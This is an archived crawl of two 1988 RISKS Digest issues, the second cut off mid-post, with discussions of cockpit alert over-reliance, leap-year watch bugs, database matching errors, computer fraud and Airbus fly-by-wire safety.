  &gt; I'd be interested in knowing if the FAA has any research on the number of
  &gt; accidents avoided because of stall warnings and ground-approach warnings as
  &gt; opposed to the number happening because the relied-upon warning failed to
  &gt; happen.

I have a little information, although not necessary exactly answering this
question.  An article that appeared in a magazine for commercial pilots warned
against complacency and overtrust in computers by pilots.  It describes several
serious incidents that occurred because pilots put too much confidence in
automatic control systems, even to the extent of rejecting their own external 
evidence that the system was wrong. Complacency and inattention appeared to 
cause them to react to failures and errors in the automatic controls much more
slowly than they should have. (see: Ternhem, "Automatic Complacency," 
Flight Crew, Winter 1981).

Also, in Normal Accidents, Charles Perrow reports on a government study
of thousands of mishaps reported voluntarily by aircraft crews and support
personnel that concluded that the altitude alert system (an aural signal) had
resulted in decreased altitude awareness by the flight crews.  It claimed that
there were more incidents of "altitude busts" when the system was used than 
when it was not used.  The study recommended that the device be disabled for 
all but a few long-distance flights.   

None of this means that such systems should not be built and used, only that 
we need to understand when they can be useful and when they can be dangerous 
and to design them very carefully according to principles of cognitive 
psychology.  It may be easier to change the way the systems are designed 
than to try to change human nature.  The important choice may not be between
using such systems or not using them but between building them with or without
careful consideration of the humans who will be interacting with them.  If we 
do not yet know enough about the way that humans interact with machines, then 
perhaps this is as important a research topic as studying the technological 
aspects of design.

</PRE>
<HR><H3><A NAME="subj2.2">
Safe Systems [<A HREF="/Risks/6.34.html">RISKS-6.34</A>]
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@ames-aurora.arpa">
steve@ames-aurora.arpa
</A>&gt;
</address>
<i>
Tue, 1 Mar 88 20:16:24 PST
</i><PRE>

Scott E. Preece (preece%fang@gswd-vms.Gould.COM) asks:
  &gt;I'd be interested in knowing if the FAA has any research on the number of
  &gt;accidents avoided because of stall warnings and ground-approach warnings as
  &gt;opposed to the number happening because the relied-upon warning failed to
  &gt;happen.

   Accidents that don't happen don't make it into FAA statistics.  
Sometimes though, the crews report to the NASA Aviation Safety 
Reporting System (ASRS) on things that went wrong and why.  

   The most frequent type of report filed concern "altitude busts", which are
unauthorized deviations from an assigned altitude.  The most commonly
mentioned factor in these cases is too great a dependence on the "altitude
alerter", a device that sounds an audio and visual alarm when an altitude
deviation occurs.  This device was intended to be a backup system; pilots are
supposed to monitor altitude as part of their primary duty.  The alerter is
only supposed to catch those events that escape the pilot's attention.  What
happens though is that this "backup system" becomes the primary method of
verifying altitude.  If the alerter is not set correctly or malfunctions,
there is no backup, and the deviation will escape detection.

   Here is a short description of two fatal crashes where alerting systems did
not do the job as intended.  One involved a Mexican airliner.  The aircraft
was in a descent (possibly unknown to the crew) that unchecked would lead to
ground contact.  The alerter sounded it's preliminary warning ("glide slope")
followed by the imperative "PULL-UP, PULL-UP".  The warning was viewed as
erroneous by the flight crew; the last words on the cockpit voice recorder
were "aw, shut-up gringo."

   The second story is more well known.  The Northwest crash in Detroit likely
involved failure of the flap position warning system.  Preliminary evidence
indicates that the flaps were not set for takeoff.  Application of full power
with flaps not set should produce a warning horn alert.  This alert was not
heard on the cockpit voice recorder.  It was noted from the cvr that the crew
did not execute the checklists properly.  The checklist is typically regarded
as the primary means of verifying that all systems are set.  If a crew elects
not to use checklists and relies on warning systems, these systems become
primary systems and their failure becomes critical.

   We also have cases where crews received some warning, could not find the
cause, assumed warning system failure and proceeded. The crew later finds that
the warning was correct, but they did not discover its nature until after the
fact.

   We still don't know how many accidents are prevented by warning systems.
Research is performed (usually in simulators) to evaluate the effects of these
systems, but we don't know how well these simulations reflect the real world.
A senior airline pilot recently told me about some of his observations: a crew
will operate informally when there's only another pilot in the jumpseat, but
when joined by an FAA inspector, all procedures are by-the-book.

   One other thing to consider (not a high-tech risk, but important none the
less).  Recent legislation in California (prop. 65) mandates the posting of
warning messages on every building where "detectable levels" of harmful or
carcinogenic substances may be found.  These warning messages are
information-free; they don't tell you that there is a safety problem or that
the area should be avoided.  The NORMAL (and correct) response is to ignore
the warning.  The real danger is that this conditions people to ignore warning
signs.  This could be very dangerous in a building where there are real
warning signs with real dangers to be avoided.

   Good luck in the real world.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Disappearing skills  [Re: Matt Bishop, <A HREF="/Risks/6.33.html">RISKS-6.33</A>]
</A>
</H3>
<address>
&lt;<A HREF="mailto:microsof!lenp@uunet.UU.NET">
microsof!lenp@uunet.UU.NET
</A>&gt;
</address>
<i>
Tue Mar  1 12:36:23 1988
</i><PRE>
Organization: Microsoft Corporation, Redmond, WA

I've often heard people say this sort of thing, but I have never been
comfortable with the argument.  It sounds a bit like, "Kids these days don't
know nuthin'.  When I was a young 'un, I had to get up before I went to bed
and walk 25 miles through the snow to milk the bull."  I mean, when I
learned penmanship in elementary school (poorly), we weren't taught how to
inscribe cuneiform symbols into wet clay, or how to trim the end of a quill
pen.  And, you know, I don't notice the lack at all.

I'm not saying that schools should stop teaching multiplication next
September, but I am saying that the skills that we need to live from day to
day are changing, and always have been.  We should be worried if we're not
teaching our kids what they need (or want) to know, but if my great-
grandchildren never see a pencil and paper, they probably don't need to be
taught pencil-and-paper arithmetic in grade school.

What do you think? Is technology weakening us by causing important skills to
atrophy?  Or is our educational system "irrelevant"?  Where does one draw
the line?
                                        Len Popp

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
       Re: Slippery slopes and the legitimatization of illegitimacy
</A>
</H3>
<address>
          Bob English 
&lt;<A HREF="mailto:lcc.bob@SEAS.UCLA.EDU">
lcc.bob@SEAS.UCLA.EDU
</A>&gt;
</address>
<i>
Wed, 2 Mar 88 00:39:38 PST
</i><PRE>

There are a few points to make here on David Thomasson's article in <A HREF="/Risks/6.33.html">RISKS-6.33</A>.

1) The point of this list is as much to identify possible risks as it is
    to identify likely risks.  The truth is that we don't know what is
    likely or unlikely, yet, but if no one even thinks of the possibilities,
    we're unlikely (BIG risk) to notice the problems until it's too late to
    prevent real damage.

2) All of the things you mention as "subject to abuse" are abused everyday.
    The primary restraint on their abuse is the existence of laws and
    penalties discouraging those abuses.  If no one bothers to identify
    possible abuses, then those penalties will not exist.
      Police agencies have a long history of going after anything and
    everything they can get unless specifically prohibited by law.  Sometimes
    their purposes are legitimate, but sometimes they are not.  But if the
    activities are legal, what would stop them?

3) It isn't enough to look at the world around us and see how this one change
    would effect things.  The world is a fluid place, and laws, ethics, and
    modes of behavior change over time.
      Suppose, for example, that we had a national data-base capable of
    tracking all but the smallest purchases and transactions, and suppose
    that the data-base was dedicated to a single purpose, with legal bar-
    riers to keep it from being misused.  As long as the legal barriers
    were sound, we would have nothing to fear from it (well, most of us,
    anyway).
      But suppose the mood of the country were to swing, and people got so
    tired of urban crime, etc. that they were willing to do anything to
    combat it.  That legal barrier could suddenly become very tenuous.  If
    the system had not been built, then it might take several years to con-
    struct, time in which people might come to their senses.  But if it
    already existed, it might be put to use immediately.
                                                               --bob--
</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Sins of RISKS and Risks of SINs
</A>
</H3>
<address>
&lt;<A HREF="mailto:Robert_Slade@mtsg.ubc.ca">
Robert_Slade@mtsg.ubc.ca
</A>&gt;
</address>
<i>
Wed, 2 Mar 88 07:46:32 PST
</i><PRE>

Re: the submissions from
   Risks of Believing in Technology (Matt Bishop)
   Slippery slopes and the legitimatization of illegitimacy (David
	Thomasson)
   File matching (Brint Cooper)
   More double troubles (Peter Capek)
in RISKS-FORUM volume 6 number 33

My first reaction on reading the initial announcement of the like to assure
him that we are not quite the neo-Luddites he suspects.  Yes, there are
benefits to the use of such a system, and yes, it should not be killed out
of hand because of the potential (possible?)  risks (problems?).  However,
it is in the nature of RISKS that such an announcement be made.  Others will
follow.  I well remember the furor that raged when I first started reading
RISKS regarding "drive by wire" (and we are now seeing it again in the
Airbus 320.)  Many important points were raised, but the most telling was
the fact that most of the concerns raised *were* being addressed by current
manufacturers in that reliable mechanical "fall-back" had been built in.
Contributions such as David's are, of course, part of the same process as
well; keeping us honest and on track.

Indeed, I found his example of phone company bills most interesting.  I
would, however, say that such an occurence *is* a risk of having a phone,
and one should be aware of it in order to take precautions.  In my case, I
have on my desk as I write a bill from the B*nk *f C*mm*rce V*S* that my
wife and I checked through last night.  We do this regularly, as our answer
to the risk of having the bank be less careful with my money than they
insist I be with theirs.  (In our case, this is the second definite error in
three months, this bill having finally shown the reversal of charges and
interest from their last mistake.  One would be tempted to make attributions
of neglect and lack of intelligence to the data entry operators and their
supervisors, but of course to do so would be to run the "possibility" of a
suit for libel, so I shan't.)  This practice I maintain in spite of the
improbablity of the occurence of an error, as is demonstrated by the history
of my B*nk *f M*ntr**l M*st*rC*rd which has not had a false charge in more
than ten years.

In the case of "Lookout", the initial announcement may well serve as a
springboard to a valuable discussion unforeseen in its inauspicious
beginning.  Who could have predicted that the announcement of a computer
virus, seemingly isolated in Israel, could have sparked a discussion
covering paranoia, terrorism, the dangers of real value in the discussion
will be the assessment of the "actual" level of risk, and the steps that can
be taken (such as the possibility of turning the thing off) to mediate that
risk.  (Can it be turned off?  Should it have an off switch?  Should the off
switch be a combination as in "drunk testing" ignition systems?  Or should
that be the way you turn it on?)

Regarding the storm over social security numbers, we had a case in Canada
(where the term is Social Insurance Number) some years back of a man who had
had his number "stolen" by another who was wreaking all manner of havoc with
it.  Taxes on the "crook's" earnings were being assessed to the original
holder and so forth.  In spite of the fact that this situation was widely
(nationally) known, the government for the longest time would not issue the
first man a new number, and at one point suggested he change his name in
order to get a new one. (The comics of the day predictably had a field day
with alternate suggestions, including quick trips to clinics in Denmark...)
 
Disclaimer: My employers completely repudiate my, or any other, opinions.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Dumb Digital Leap Year Madness
</A>
</H3>
<address>
&lt;<A HREF="mailto:MJackson.Wbst@Xerox.COM">
MJackson.Wbst@Xerox.COM
</A>&gt;
</address>
<i>
2 Mar 88 09:25:33 EST (Wednesday)
</i><PRE>

In Volume 6 : Issue 34 Mark Brader writes:

&gt; All right now -- how many people reading this *haven't yet realized* that 
&gt; their watches have to be set back 1 day, because they went from February 28 
&gt; directly to March 1?

while in reference to the "illegal account expiration date generator"
problem at CMU Michael Wagner identifies

&gt; Two different representations/algorithms for dates, (the 'date 
&gt; interpreter', whatever that is, and the 'account creator') with different 
&gt; handling for unusual cases.

as one of the contributory design mistakes.

An odd example of the intersection of these:  I glanced at my digital watch on
*Tuesday* and saw that it was incorrectly displaying March 2 as the date, so I
reset it.  But all day Monday it had been, presumably, incorrectly displaying
March 1; why had I not noticed the error earlier?

I believe the reason is that I *knew* Monday was "leap year day" and never
needed my watch to tell me it was February 29.  I doubtless checked the time on
numerous occasions without "seeing" the incorrect date, even though it is
continuously displayed.

But despite "knowing" it was leap year day I never thought to reset my watch!
"Two different representations/algorithms for dates" indeed.
                                                                    Mark

    [Last time we talked about calendar algorithms, someone commented that
    we should rather be talking about important problems.  First, in some
    critical systems little things like this could become devastating.  Second,
    if we can't get the simple stuff right, then what about the complicated
    stuff.  Sure, we try harder on the complicated stuff.  Phooey.  PGN]

</PRE>
<HR><H3><A NAME="subj6.2">
Risks of Leap Years and Dumb Digital Watches
</A>
</H3>
<address>
&lt;<A HREF="mailto:Matthew_Kruk@mtsg.ubc.ca">
Matthew_Kruk@mtsg.ubc.ca
</A>&gt;
</address>
<i>
Wed, 2 Mar 88 11:44:54 PST
</i><PRE>

Had no problems with mine. It's a Phoenix (who?) Quartz that I bought at
Sears for $20 (it came with a pocket calculator) about 5 years ago. I have
never had to bother adjusting it (except for daylight saving time) since I
initially set it and merely need to buy a battery once a year. Beats the
hell out of any watch that I ever had, paid more for or had some popular
"designer" name on it.
 
Moral: $20 and a pocket calculator are sometimes worth more than a $100 watch
       that flew out the window along with it's time.
 
</PRE>
<HR><H3><A NAME="subj6.3">
 Re: Risks of Leap Years and Dumb Digital Watches
</A>
</H3>
<address>
    Brint Cooper 
&lt;<A HREF="mailto:abc@BRL.ARPA">
abc@BRL.ARPA
</A>&gt;
</address>
<i>
Wed, 2 Mar 88 11:44:37 EST
</i><PRE>

Well, I had to set back my watch one day but only because it thought the
year was 1901 rather than 1988.  I forgot to reset the year when I had
the battery changed!

Perhaps this is a risk of not paying attention to technology?

</PRE>
<HR><H3><A NAME="subj6.4">
Leap years, watches and portables
</A>
</H3>
<address>
&lt;<A HREF="mailto:Robert_Slade@cc.sfu.ca">
Robert_Slade@cc.sfu.ca
</A>&gt;
</address>
<i>
Wed, 2 Mar 88 09:06:06 PST
</i><PRE>

Our brand new Sharp 4501 laptop thinks it is Wed., February 31, 1988.  This
must be a problem in the machine itself, as I have not yet booted the system
disk.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: Virus security hole
</A>
</H3>
<address>
Scot E. Wilcoxon
&lt;<A HREF="mailto:sewilco@datapg.mn.org ">
sewilco@datapg.mn.org 
</A>&gt;
</address>
<i>
1 Mar 88 02:27:36 CST (Tue)
</i><PRE>
Organization: Data Progress, Minneapolis

In RISKS 6:31, Kevin Driscoll mentions that data can escape from a secure
area in unexpected ways.  With all the vandal viruses on the loose, an
obvious way of leaking data is by modulating the frequency or flow of
reloads from backup.  If "scout" virus got into an installation, it may
slowly provide information to anyone who can observe the reload efforts.

If the scout virus simply needs to emit one signal (meaning "There's Something
Very Interesting Here!"), it can force a reload large enough to be detectable.
The signal can be detected by listening carefully to any of the resulting
frustrated staff.  "Computer was down today" doesn't seem to carry any
information.

If the secret is more important than the workers, could a failure that is
suspected of being caused as a signal cause people to pretend normal
activity on a crashed machine?  What a tangled net we weave...

Scot E. Wilcoxon	sewilco@DataPg.MN.ORG	ihnp4!meccts!datapg!sewilco

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.34.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.36.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-72</DOCNO>
<DOCOLDNO>IA012-000130-B025-43</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.36.html 128.240.150.127 19970217015907 text/html 30920
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:57:30 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 36</TITLE>
<LINK REL="Prev" HREF="/Risks/6.35.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.37.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.35.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.37.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 36</H1>
<H2>  Thursday 3 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
$9.5 million computer-based check fraud 
</A>
<DD>
<A HREF="#subj1.1">
Donn Parker
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Captain Zap Zaps Hackers 
</A>
<DD>
<A HREF="#subj2.1">
Donn Parker
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Police computer problem 
</A>
<DD>
<A HREF="#subj3.1">
Michael J. Wallach
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  On the topic of correlating databases... 
</A>
<DD>
<A HREF="#subj4.1">
Matt Fichtenbaum
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  RISKs of computer swapping 
</A>
<DD>
<A HREF="#subj5.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Bank ATMs and checking your statements 
</A>
<DD>
<A HREF="#subj6.1">
David Andrew Segal
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Airbus Safety; Database Accuracy 
</A>
<DD>
<A HREF="#subj7.1">
Mike Olson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Slippery slopes &amp; relative risk 
</A>
<DD>
<A HREF="#subj8.1">
Stephen Schaefer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: Disappearing Skills 
</A>
<DD>
<A HREF="#subj9.1">
Ronald J Bottomly
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Invalid dates 
</A>
<DD>
<A HREF="#subj10.1">
Ross Patterson
</A><br>
<A HREF="#subj10.2">
 Lee Ridgway
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Neural networks and P1 
</A>
<DD>
<A HREF="#subj11.1">
Dave Pare
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj12">
  Ada-caused bugs? 
</A>
<DD>
<A HREF="#subj12.1">
Jerry Harper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj13">
  Aerospace Computer Security Applications Conference 
</A>
<DD>
<A HREF="#subj13.1">
Marshall D. Abrams
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
$9.5 million computer-based check fraud
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Thu 3 Mar 88 11:22:37-PST
</i><PRE>

Four employees of the DCASR (Defense Contract Administration Services Region)
office in El Segundo CA are accused of having "prepared some false documents
and tricked some coworkers" to rig the DCASR computer to issue a check for
$9.5 million to one of them individually as payment for a legitimate invoice
from a legitimate contractor.  A bank officer apparently became suspicious
when the person trying to deposit the check wanted $600,000 in cash on the
spot, and called in the law.  One of the defense lawyers blamed the events on
OTHER DCASR employees.  "Because of incompetence, lack of control and
violation of regulations, it's impossible to know exactly what happened in
this case, who did what and when they did it."

[Source: Evening Outlook, Santa Monica CA, 4 February 1988, courtesy of 
Donn B. Parker]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Captain Zap Zaps Hackers
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Thu 3 Mar 88 11:29:01-PST
</i><PRE>

"Ian A. Murphy, a.k.a. Captain Zap, is selling his underworld expertise to USA
corporations that want to keep hackers from busting into their computer
systems.  Night after night, [...] the cherubic Captain sits at his dusty
computer in a cluttered, run-down townhouse here, scanning electronic bulletin
boards -- where tips and gossip are traded by computer.  Someone may drop a
hit about breaking into one of his clients' computers.

Murphy is one of a handful of convicted computer felons who make decent
livings ($200,000 last year, he says) using the skills that helped land him
in trouble in the first place.  His slogan: ``Everybody's into computers.
Who's into yours?''

[...]  Murphy claims to employ seven to 10 of the USA's top hackers to break
into computers -- legally, that is."

[USA TODAY cover story by Mark Lewyn, no date available, courtesy of
Donn B. Parker]

     [$200,000 sounds INDECENT to me.  Nice time to plant Trojan horses?  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Police computer problem -- lighting up license-plate matches
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Thu 3 Mar 88 11:04:13-PST
</i><PRE>

John Stapelton, 35, a computer consultant from Yonkers NY was stopped while
driving in The Bronx and was frisked because a random check of automobile
licenses in the police computer system erroneously turned up his car as that
of someone who had killed a state trooper.  Strangely the database record did
not include the make of the car, which might have been a tip-off that the
actual license of the killer had been entered inaccurately.

Stapleton said the cops admitted the car computer system has its faults.
``They told me it tilts on them all the time.''  In this case they let him go
after deleting the incorrect entry.  Officers of the Bronx' 50th Precinct
claimed to have no record of the incident, but that is not surprising because
no arrest was made.

[Source: An article by Joy Cook and Linda Stevens in the New York Daily News,
no date available, contributed by Michael J. Wallach, Innovative Computer
Solutions, 31 Tulip Circle, Staten Island NY 10312.]

    [The subject of accepting partial matches is a very thorny one,
    especially in the presence of inaccurate data.  One approach is that
    much greater effort is needed in training personnel who interpret
    partial matches.  Another is that systems that try to do partial
    matching should REJECT unconfirmed input data and should continually
    warn the users...  I already suggested adding a pervasive measure of
    data trustworthiness -- see my endnote on the message from James H.
    Coombs in <A HREF="/Risks/3.32.html">RISKS-3.32</A>.  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
On the topic of correlating databases...
</A>
</H3>
<address>
Matt Fichtenbaum
&lt;<A HREF="mailto:mlf@genrad.com ">
mlf@genrad.com 
</A>&gt;
</address>
<i>
Wed, 2 Mar 88 09:15:08 est
</i><PRE>

This RISKS digest mentioned the Post Office matching its list of employees
against a list of debtors (ah, the wonders of computer technology).  Some
20 or so years ago, the State of New York did a match of driver's license
holders against recipients of state aid to the blind.  This operation
found, I think I remember, a few hundred people who were on both lists.

But then, anyone who's driven in New York City could have guessed that.

    [I had a NY driver's license from 1948, and was able to renew it with
    no effort even though no longer residing in NY -- until in the late 60s
    they decided to request an eye reexamination!  So those who became blind
    also had no trouble until then.  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
RISKs of computer swapping
</A>
</H3>
<address>
Dave Horsfall
&lt;<A HREF="mailto:munnari!stcns3.stc.oz.au!dave@uunet.UU.NET ">
munnari!stcns3.stc.oz.au!dave@uunet.UU.NET 
</A>&gt;
</address>
<i>
Thu, 3 Mar 88 15:28:30 est
</i><PRE>

Sometimes, the RISK in computers is in trying to dispose of them, as the
following story shows.

From "Computing Australia", Feb 29th:

``Cream of Canberra wades through rulebook for simple solution.

  When the Department of Science was dissolved into the Dept. of Industry,
  Technology and Commerce last year, officials discovered the two departments
  had non-compatible computing equipment.  Ditac [Dept of I T and C] used
  IBM pcs, while Science had always favoured Convergent Technology.  It was
  decided the CT system would be abandoned and put into storage.

  At the same time, Ditac began to suffer a shortage of computing equipment.
  Some bright spark suggested if another department could be found to use
  the CT gear, it might be swapped for IBM-compatible pcs.

  Then the real snag struck.  The Department of Finance stepped in to
  question the mechanics of the proposal.  Was the arrangement legal?
  It had not been done before.  The regulations made no mention of swaps.
  Maybe the rules would have to be re-drafted.  Interdepartmental meetings
  were held.  Possibilities canvassed.  Eventually a circuit-breaker [?]
  was called for: an outside legal opinion.

  Finally, after weeks of effort and argument, 67 networked microcomputers
  and a minicomputer have been taken from the stores and exchanged for 48
  pc clones.  Everyone's a winner and bureaucracy triumphs.

Dave Horsfall, dave@stcns3.stc.OZ.AU, ...munnari!stcns3.stc.OZ.AU!dave

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Bank ATMs and checking your statements
</A>
</H3>
<address>
David Andrew Segal
&lt;<A HREF="mailto:dasegal@brokaw.LCS.MIT.EDU ">
dasegal@brokaw.LCS.MIT.EDU 
</A>&gt;
</address>
<i>
Wed, 2 Mar 88 21:55:26 EST
</i><PRE>

RISKS readers are well aware of the need to check on technology, I learned
this the other week when after allowing four months of bank statements to pile
up, I decided to catch up and reconcile them all.

In early December I deposited a check in the bank's ATM and as I always do
saved my receipt and then later entered the transaction in my check book.
Upon reconciling my statement, I noticed that the deposit had never been
credited to my account.  I found the receipt and noticed that the transaction
was noted as "Deposit not completed."  I knew that since I saved the receipt I
must have deposited the check.  I contacted the individual who gave me the
check and noted that it had indeed been debited from their account 9 days
after I had deposited it.  I contacted my bank and was informed that since the
transaction code stated I never completed the deposit I must be mistaken.
After getting a copy of the check (which had my account number in the
endorsement in addition to all the usual bank's endorsements), the bank
finally credited my account for the missing amount.

I wonder what the bank did in their reconcilation?  When they checked the
machine the fact that they had an extra envelope and deposit didn't bother
them nor did they find it necessary to credit any account but their own.

This certainly shows the need for good record keeping as well as continuing to
check on technology.

David Andrew Segal          

      [When a supposedly indivisible transaction fails to complete properly,
      this is known as an atomic bomb.  If the kernel of the operating system
      is at fault, it is known as nuclear con-fusion.  Consistency may be 
      seen as the hobgoblin of little minds in life, but in computer
      programming we mind more than a little when the system fails with a
      gob of hobblin' code.   PGN]

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Airbus Safety [<A HREF="/Risks/3.32.html">RISKS-3.32</A>]; Database Accuracy [old topic]
</A>
</H3>
<address>
Mike Olson
&lt;<A HREF="mailto:blia.UUCP!blipyramid!mao@cgl.ucsf.edu ">
blia.UUCP!blipyramid!mao@cgl.ucsf.edu 
</A>&gt;
</address>
<i>
Wed, 2 Mar 88 08:58:15 PST
</i><PRE>

1. Airbus Safety

In RISKS 3:32,  Nancy Leveson writes (from the London Sunday Times, 13 Dec.):
&gt;  "Airbus yesterday rejected the charges, and said the 320 would be the safest
&gt;  passenger aircraft ever.  `We believe that the safety requirement of a total
&gt;  breakdown occurring only once every billion hours is achievable,' a 
&gt;  spokesman said.  Airbus dismissed Hennell's fears as extravagant and 
&gt;  `wildly off target,' but admitted the computer had failed during test 
&gt;  flying.  The breakdowns were caused by teething problems and the aircraft 
&gt;  had landed safely, it said."

Airbus' statement is less than comforting.  Will only a "total" breakdown
cause the pilot to lose control of the plane?  How badly does some component
of the system need to fail before the plane crashes?

The quote about "teething problems" is also alarming.  Since this is the first
civilian aircraft with fly-by-wire technology, I assume that that technology
is still relatively new.  Does the certification board, or Airbus, or anyone
else, have sufficient expertise to guarantee that the system's teeth are all
in yet?

Particularly in a system like this, where human lives are on the line,
we need to be very careful about deployment.  Testing components and letting
a couple of Navy pilots take the plane up isn't sufficient.  Large systems
tend to fail because of unexpected interaction among their components.  I'd
be *very* interested in examining Arbus' test suite.


2. Database Accuracy

In an earlier RISKS digest, Amos Shapir writes of problems in reliably
identifying people from a database with no reliable primary key.  James
Coombs comments:

&gt;               A naive operator may well not be aware that more than one
&gt; record has been retrieved (yes, there may still be some irresponsibility
&gt; here).  Whether or not the incident followed this scenario, we should keep
&gt; the possibility in mind and consider displaying the number of records
&gt; retrieved before displaying any records.

This theme is an old one is RISKS, and other contributors have addressed the
issue at length.  From personal experience, though, I add the following:

The "clerks" responsible for entering and retrieving data are often both
undertrained and underpaid.  It's hard to convince someone who's making
minimum wage to care much about accuracy; they want to do their jobs with
no fuss or bother, and forget about them at the end of the day.  Given a
database for (for example) the registration of all citizens, their addresses
and credit histories, bank balances and criminal records, misuse (whether or
not it's inadvertent) is virtually guaranteed.

I used to work for a hospital billing agency; the data entry people there were
mostly high-school dropouts living at just about the poverty line, and we had
problems like this all the time.  Once, for example, two patients with the
same name were admitted to the hospital on the same day, went into surgery
on the same day, and were released on the same day.  One was an eighty-year-
old man in for a hip replacement; the other was a young woman in for a
Ceasarian section.  Our database wasn't well-constructed; the eighty-year-old
